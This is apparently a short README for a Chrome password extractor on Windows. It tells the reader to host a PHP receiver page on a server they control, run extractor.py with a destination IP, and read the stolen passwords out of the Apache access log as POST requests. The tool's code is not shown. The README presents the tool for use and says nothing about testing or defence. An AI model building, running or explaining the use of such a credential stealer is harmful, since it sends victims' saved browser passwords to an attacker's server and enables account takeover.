# extractor
Chrome password extractor for windows

First, set up a php page on a web server you control named ssftp.php
After installing necessary modules with and chmod'ing it with `pip install -r requirements.txt && chmod +x extractor.py`, run with `./extractor.py destination_ip`\
The passwords will be in the access.log file if apache2 is used formatted as a post request.

TODO: clean up chrome_password_extractor.py\
      fix issues with modules not installing\
      maybe build .py file into an executable
